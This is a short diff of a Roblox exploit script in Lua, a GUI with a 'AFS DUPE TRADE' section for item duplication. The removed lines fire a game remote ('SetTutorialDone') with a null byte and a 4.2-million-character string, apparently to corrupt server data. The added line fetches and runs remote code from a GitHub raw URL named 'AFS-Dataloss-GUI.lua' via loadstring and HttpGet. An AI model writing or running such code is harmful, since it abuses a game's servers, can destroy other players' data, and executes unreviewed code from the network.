@@ -7,11 +7,7 @@ local Page1 = windowz:CreatePage("Trade CC")
 local Section1 = Page1:CreateSection("AFS DUPE TRADE")
 
 Section1:CreateButton("By Tobidupebest", function ()
-  local args = {
-    [1] = "\0" .. string.rep("B", 4200000)
-}
-
-game:GetService("ReplicatedStorage"):WaitForChild("Remote"):WaitForChild("SetTutorialDone"):FireServer(unpack(args))
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/Tobias020108Back/YBA-AUT/main/AFS-Dataloss-GUI.lua"))()
 end)
 
 Section1:CreateButton("simple spy", function ()
